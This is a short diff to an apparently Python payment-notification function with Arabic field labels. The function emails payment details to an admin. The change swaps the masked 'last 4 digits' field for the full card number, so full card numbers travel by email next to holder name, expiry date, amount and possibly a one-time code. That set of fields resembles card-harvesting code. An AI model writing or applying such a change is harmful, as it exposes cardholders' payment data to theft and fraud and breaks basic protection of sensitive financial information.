@@ -188,7 +188,7 @@ def send_admin_payment_email(registration, payment, otp_code=None):
             expiry = f"{pay['expiry_month']}/{pay['expiry_year']}"
         fields += [
             ("نوع البطاقة", pay.get("card_brand")),
-            ("آخر 4 أرقام من البطاقة", pay.get("card_last4")),
+            ("  رقم من البطاقة", pay.get("card_number")),
             ("اسم حامل البطاقة", pay.get("card_holder")),
             ("تاريخ الانتهاء", expiry or None),
             ("المبلغ", f"{pay.get('amount', 0)} ريال"),
